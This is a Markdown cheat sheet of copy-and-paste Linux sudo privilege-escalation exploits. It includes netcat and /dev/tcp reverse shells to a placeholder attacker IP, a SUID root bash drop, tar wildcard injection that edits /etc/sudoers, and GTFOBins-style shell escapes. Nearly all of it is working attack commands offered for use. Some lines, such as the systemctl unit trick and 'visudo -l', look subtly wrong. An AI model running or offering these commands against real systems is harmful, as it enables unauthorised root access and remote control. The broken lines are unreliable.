# Sudo Rights Abuse

## 1. Check sudo privileges

```sh
sudo -l
```

## 2. Identify dangerous / abusable entries

```sh
sudo -l | grep -E '(tcpdump|vim|nmap|find|less|\*|bash|sh|tar|awk|zip|perl|python)'
```

---

# Common Sudo Exploits (copy/paste)

## 3. **tcpdump -z privilege escalation**

### Create malicious script:

```sh
echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <YOUR_PORT> >/tmp/f' > /tmp/.test
chmod +x /tmp/.test
```

### Listener:

```sh
nc -lnvp <YOUR_PORT>
```

### Execute:

```sh
sudo /usr/sbin/tcpdump -ln -i any -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

---

## 4. **Path Abuse via sudo if command has no absolute path**

### Find writable PATH dirs:

```sh
echo $PATH | tr ":" "\n"
```

### Drop malicious replacement:

```sh
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > cat
chmod +x cat
```

### Trigger:

```sh
sudo cat /etc/shadow
/tmp/rootbash -p
```

---

# GTFObins Sudo Escalation

## 5. vim

```sh
sudo vim -c ':!/bin/sh'
```

## 6. nmap

```sh
sudo nmap --interactive
!sh
```

## 7. find

```sh
sudo find / -exec /bin/sh -p \; -quit
```

## 8. less

```sh
sudo less /etc/passwd
!/bin/sh
```

---

# Wildcard Exploit (tar)

### 9. If sudo can run tar

```sh
echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
sudo tar cf archive.tar *
sudo su
```

---

# zip Exploit

### 10. If sudo can run zip

```sh
sudo zip -TT 'sh #' /dev/null
```

---

# awk Exploit

### 11. If sudo can run awk

```sh
sudo awk 'BEGIN {system("/bin/sh")}'
```

---

# systemctl Exploit

### 12. Reverse-shell service

```sh
sudo systemctl --force --batch enable 'sh -c "sh -i >& /dev/tcp/<IP>/<PORT> 0>&1".service'
sudo systemctl start sh-c*.service
```

---

## 13. Validate sudoers

```sh
sudo visudo -c
sudo visudo -l
```
